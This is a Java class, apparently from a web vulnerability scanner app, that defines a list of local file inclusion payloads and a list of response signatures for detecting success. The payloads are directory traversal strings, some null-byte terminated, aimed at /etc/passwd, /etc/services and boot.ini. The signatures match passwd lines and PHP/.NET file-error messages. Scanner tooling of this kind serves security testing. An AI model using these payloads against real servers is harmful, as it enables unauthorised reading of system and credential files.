package com.example.laxba.testapp.PaySig;

/**
 * Created by laxba on 11/15/2019.
 */
public class psLFI {

    private static String[] arrSigLFI;
    private static String[] arrPayLFI;

    public psLFI() {
        arrSigLFI = new String[]{
                "root:x:0:0",
                "root:*:0:0",
                "www-data:x:",
                "[boot loader]",
                "java.io.FileNotFoundException:",
                "fread(): supplied argument is not",
                "fpassthru(): supplied argument is not",
                "for inclusion (include_path=",
                "Failed opening required",
                "Warning: file(", "file()",
                "<b>Warning</b>:  file(",
                "Warning: readfile(",
                "<b>Warning:</b>  readfile(",
                "Warning: file_get_contents(",
                "<b>Warning</b>:  file_get_contents(",
                "Warning: show_source(",
                "<b>Warning:</b>  show_source(",
                "Warning: highlight_file(",
                "<b>Warning:</b>  highlight_file(",
                "System.IO.FileNotFoundException:",};

        arrPayLFI = new String[]{
                "/etc/passwd",
                "/etc/passwd\0",
                "c:\\boot.ini",
                "c:\\boot.ini\0",
                "../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../etc/passwd\0",
                "../../../../../../../../../../../../../../../../../../../../etc/services\0",
                "../../../../../../../../../../boot.ini",
                "../../../../../../../../../../../../../../../../../../../../boot.ini",
                "../../../../../../../../../../boot.ini\0",
        };
    }


    public String[] getArrSigLFI() {
        return arrSigLFI;
    }

    public String[] getArrPayLFI() {
        return arrPayLFI;
    }
}
